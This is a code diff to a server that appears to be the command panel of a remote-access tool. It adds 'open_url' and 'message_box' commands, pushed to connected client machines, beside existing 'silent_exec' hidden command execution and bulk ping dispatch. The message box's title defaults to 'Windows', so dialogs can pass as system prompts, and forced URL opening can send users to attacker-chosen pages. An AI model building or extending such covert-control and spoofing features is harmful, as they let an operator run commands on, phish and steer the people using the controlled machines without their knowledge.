@@ -40,6 +40,62 @@ function clampPositiveInt(value: unknown, fallback: number, max: number): number
   return Math.min(max, Math.max(1, Math.floor(parsed)));
 }
 
+const MESSAGE_BOX_ICONS = new Set(["error", "warning", "info", "question"]);
+const MAX_OPEN_URL_LENGTH = 2048;
+const MAX_MESSAGE_BOX_TITLE = 256;
+const MAX_MESSAGE_BOX_TEXT = 2048;
+
+export function normalizeOpenUrl(raw: unknown): { ok: true; url: string } | { ok: false; error: string } {
+  const value = typeof raw === "string" ? raw.trim() : "";
+  if (!value) return { ok: false, error: "url is required" };
+  if (value.length > MAX_OPEN_URL_LENGTH) return { ok: false, error: "url is too long" };
+
+  let candidate = value;
+  if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
+    candidate = `https://${candidate}`;
+  }
+
+  let parsed: URL;
+  try {
+    parsed = new URL(candidate);
+  } catch {
+    return { ok: false, error: "invalid url" };
+  }
+
+  const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
+  if (scheme !== "http" && scheme !== "https") {
+    return { ok: false, error: "only http and https urls are allowed" };
+  }
+  if (!parsed.hostname) {
+    return { ok: false, error: "invalid url" };
+  }
+
+  return { ok: true, url: parsed.toString() };
+}
+
+export function normalizeMessageBox(body: any): {
+  ok: true;
+  title: string;
+  text: string;
+  icon: string;
+} | { ok: false; error: string } {
+  const text = typeof body?.text === "string" ? body.text.trim() : "";
+  if (!text) return { ok: false, error: "text is required" };
+  if (text.length > MAX_MESSAGE_BOX_TEXT) return { ok: false, error: "text is too long" };
+
+  let title = typeof body?.title === "string" ? body.title.trim() : "";
+  if (!title) title = "Windows";
+  if (title.length > MAX_MESSAGE_BOX_TITLE) return { ok: false, error: "title is too long" };
+
+  const iconRaw = typeof body?.icon === "string" ? body.icon.trim().toLowerCase() : "info";
+  const icon = iconRaw === "alert" ? "warning" : iconRaw;
+  if (!MESSAGE_BOX_ICONS.has(icon)) {
+    return { ok: false, error: "icon must be error, warning, info, or question" };
+  }
+
+  return { ok: true, title, text, icon };
+}
+
 export function dispatchPingBulk(target: ClientInfo, countValue: unknown): number {
   const count = clampPositiveInt(countValue, 1, 1000);
   for (let i = 0; i < count; i++) {
@@ -246,6 +302,45 @@ export async function handleClientCommandRoute(
       target.ws.send(encodeMessage({ type: "command", commandType: "silent_exec", id: cmdId, payload: { command, args, cwd } }));
       metrics.recordCommand("silent_exec");
       logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.SILENT_EXECUTE, targetClientId: targetId, success: true, details: JSON.stringify({ command, args, cwd }) });
+    } else if (action === "open_url") {
+      const normalized = normalizeOpenUrl(body?.url);
+      if (!normalized.ok) {
+        return Response.json({ ok: false, error: normalized.error }, { status: 400, headers: deps.CORS_HEADERS });
+      }
+      const cmdId = uuidv4();
+      target.ws.send(encodeMessage({ type: "command", commandType: "open_url", id: cmdId, payload: { url: normalized.url } }));
+      metrics.recordCommand("open_url");
+      logAudit({
+        timestamp: Date.now(),
+        username: user.username,
+        ip,
+        action: AuditAction.COMMAND,
+        targetClientId: targetId,
+        success: true,
+        details: `open_url:${normalized.url.slice(0, 200)}`,
+      });
+    } else if (action === "message_box") {
+      const normalized = normalizeMessageBox(body);
+      if (!normalized.ok) {
+        return Response.json({ ok: false, error: normalized.error }, { status: 400, headers: deps.CORS_HEADERS });
+      }
+      const cmdId = uuidv4();
+      target.ws.send(encodeMessage({
+        type: "command",
+        commandType: "message_box",
+        id: cmdId,
+        payload: { title: normalized.title, text: normalized.text, icon: normalized.icon },
+      }));
+      metrics.recordCommand("message_box");
+      logAudit({
+        timestamp: Date.now(),
+        username: user.username,
+        ip,
+        action: AuditAction.COMMAND,
+        targetClientId: targetId,
+        success: true,
+        details: `message_box:${normalized.icon}:${normalized.title.slice(0, 80)}`,
+      });
     } else if (action === "uninstall") {
       try {
         requirePermission(user, "clients:uninstall");
